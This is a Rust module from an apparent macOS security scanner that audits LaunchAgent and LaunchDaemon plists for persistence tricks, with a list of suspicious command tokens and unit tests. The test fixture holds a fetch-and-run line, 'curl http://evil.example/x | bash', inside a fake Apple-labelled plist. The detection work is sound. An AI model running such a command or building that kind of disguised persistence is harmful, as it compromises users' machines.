//! LaunchAgent / LaunchDaemon audit — the #1 macOS persistence vector.

use std::path::{Path, PathBuf};

use plist::Value;

use super::{is_writable_path, severity_from_score, AuditCategory, AuditFinding, AUDIT_EMIT_THRESHOLD};

/// Directories to inspect, paired with their category.
fn launch_dirs() -> Vec<(PathBuf, AuditCategory)> {
    let mut dirs = vec![
        (PathBuf::from("/Library/LaunchAgents"), AuditCategory::LaunchAgent),
        (PathBuf::from("/Library/LaunchDaemons"), AuditCategory::LaunchDaemon),
    ];
    if let Some(home) = dirs::home_dir() {
        dirs.push((home.join("Library/LaunchAgents"), AuditCategory::LaunchAgent));
    }
    dirs
}

/// Returns (findings, number of plists inspected).
pub fn audit() -> (Vec<AuditFinding>, usize) {
    let mut findings = Vec::new();
    let mut inspected = 0;
    for (dir, category) in launch_dirs() {
        let rd = match std::fs::read_dir(&dir) {
            Ok(rd) => rd,
            Err(_) => continue,
        };
        for entry in rd.flatten() {
            let path = entry.path();
            if path.extension().and_then(|e| e.to_str()) != Some("plist") {
                continue;
            }
            inspected += 1;
            if let Some(f) = inspect(&path, category) {
                findings.push(f);
            }
        }
    }
    (findings, inspected)
}

fn inspect(path: &Path, category: AuditCategory) -> Option<AuditFinding> {
    let value = Value::from_file(path).ok()?;
    let dict = value.as_dictionary()?;

    let label = dict
        .get("Label")
        .and_then(|v| v.as_string())
        .unwrap_or("")
        .to_string();

    // Assemble the launched command line.
    let mut argv: Vec<String> = Vec::new();
    if let Some(p) = dict.get("Program").and_then(|v| v.as_string()) {
        argv.push(p.to_string());
    }
    if let Some(arr) = dict.get("ProgramArguments").and_then(|v| v.as_array()) {
        for a in arr {
            if let Some(s) = a.as_string() {
                argv.push(s.to_string());
            }
        }
    }
    let program = argv.first().cloned().unwrap_or_default();
    let joined = argv.join(" ");

    let mut reasons: Vec<String> = Vec::new();
    let mut score = 0u32;

    if !program.is_empty() && is_writable_path(&program) {
        reasons.push(format!("executes from a user-writable/temp path: {program}"));
        score += 35;
    }

    let run_at_load = dict
        .get("RunAtLoad")
        .and_then(|v| v.as_boolean())
        .unwrap_or(false);
    // KeepAlive may be a boolean or a dictionary of conditions; any non-false
    // form means "respawn".
    let keep_alive = dict
        .get("KeepAlive")
        .map(|v| v.as_boolean().unwrap_or(true))
        .unwrap_or(false);
    if run_at_load && keep_alive {
        reasons.push("auto-starts and respawns (RunAtLoad + KeepAlive)".into());
        score += 10;
    }

    if let Some(interval) = dict.get("StartInterval").and_then(|v| v.as_signed_integer()) {
        if (1..=3600).contains(&interval) {
            // Weak on its own (legit updaters poll hourly); meaningful in combination.
            reasons.push(format!("periodic StartInterval ({interval}s)"));
            score += 10;
        }
    }

    for tok in [
        "osascript",
        "curl",
        "wget",
        "| bash",
        "| sh",
        "| zsh",
        "base64",
        "python -c",
        "python3 -c",
        "perl -e",
        "/tmp/",
    ] {
        if joined.contains(tok) {
            reasons.push(format!("launches via suspicious token '{tok}'"));
            score += 20;
            break;
        }
    }

    if let Some(env) = dict
        .get("EnvironmentVariables")
        .and_then(|v| v.as_dictionary())
    {
        if env.keys().any(|k| k.contains("DYLD_INSERT_LIBRARIES")) {
            reasons.push("injects a dylib via DYLD_INSERT_LIBRARIES".into());
            score += 35;
        }
    }

    // Apple-spoofing label whose program is NOT in an Apple-owned location.
    // (Real Apple launchd jobs run from /System or /usr/libexec; never from a
    // user dir.) We do not treat `com.google.*` etc. as spoofing — legitimate
    // vendors genuinely use their own reverse-DNS identifiers.
    let spoofs = label.starts_with("com.apple.")
        && !program.is_empty()
        && !program.starts_with("/System/")
        && !program.starts_with("/usr/")
        && !program.starts_with("/Library/Apple/");
    if spoofs {
        reasons.push(format!("label '{label}' impersonates an Apple identifier"));
        score += 30;
    }

    if score < AUDIT_EMIT_THRESHOLD {
        return None;
    }

    let title = if label.is_empty() {
        path.file_name()
            .map(|n| n.to_string_lossy().into_owned())
            .unwrap_or_default()
    } else {
        label
    };

    Some(AuditFinding {
        category,
        location: path.to_path_buf(),
        title,
        severity: severity_from_score(score),
        reasons,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::engine::verdict::Severity;

    #[test]
    fn flags_malicious_launch_agent() {
        let dir = tempfile::tempdir().unwrap();
        let plist = dir.path().join("com.apple.softwareupdate.plist");
        // Apple-spoofing label, temp-dir program, auto-start + beacon: textbook.
        std::fs::write(
            &plist,
            r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key><string>com.apple.softwareupdate</string>
    <key>ProgramArguments</key>
    <array>
        <string>/tmp/.hidden/agent</string>
        <string>-c</string>
        <string>curl http://evil.example/x | bash</string>
    </array>
    <key>RunAtLoad</key><true/>
    <key>KeepAlive</key><true/>
    <key>StartInterval</key><integer>60</integer>
</dict>
</plist>"#,
        )
        .unwrap();

        let finding = inspect(&plist, AuditCategory::LaunchAgent).expect("should flag");
        assert!(matches!(finding.severity, Severity::High | Severity::Critical));
        assert!(finding.reasons.len() >= 3, "reasons: {:?}", finding.reasons);
    }

    #[test]
    fn ignores_benign_launch_agent() {
        let dir = tempfile::tempdir().unwrap();
        let plist = dir.path().join("com.example.app.plist");
        std::fs::write(
            &plist,
            r#"<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0">
<dict>
    <key>Label</key><string>com.example.app</string>
    <key>ProgramArguments</key>
    <array><string>/Applications/Example.app/Contents/MacOS/helper</string></array>
    <key>RunAtLoad</key><true/>
</dict>
</plist>"#,
        )
        .unwrap();
        assert!(inspect(&plist, AuditCategory::LaunchAgent).is_none());
    }
}
